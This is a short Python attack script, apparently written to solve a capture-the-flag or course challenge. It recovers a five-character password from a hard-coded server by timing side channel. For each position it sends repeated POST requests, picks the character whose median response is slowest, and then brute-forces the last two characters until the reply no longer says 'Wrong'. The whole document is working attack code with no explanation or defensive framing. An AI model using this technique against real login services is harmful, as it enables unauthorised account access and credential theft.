#!/usr/bin/python3

import requests
import string
import itertools
import statistics

N_PROBES = 3
PASS_LEN = 5
CHARS = string.ascii_letters + string.digits

guess = ''
time_dict = {}
while (len(guess) != PASS_LEN - 2):
    for char in CHARS:
        password = guess + char + 'a' * (PASS_LEN - len(guess) - 1)
        payload = {'password': password}
        mean_times = []
        for i in range(N_PROBES):
            r = requests.post('http://141.85.224.119:31337', json=payload)
            mean_times.append(r.elapsed.total_seconds())
        time_dict[char] = statistics.median(mean_times)
    guess += sorted(time_dict.items(), key=lambda item: item[1], reverse=True)[0][0]

for chars in itertools.product(CHARS, repeat=2):
    ending = ''.join(chars)
    password = guess + ending
    payload = {'password': password}
    r = requests.post('http://141.85.224.119:31337', json=payload)
    if 'Wrong' not in r.text:
        print(password, r.text)
        break
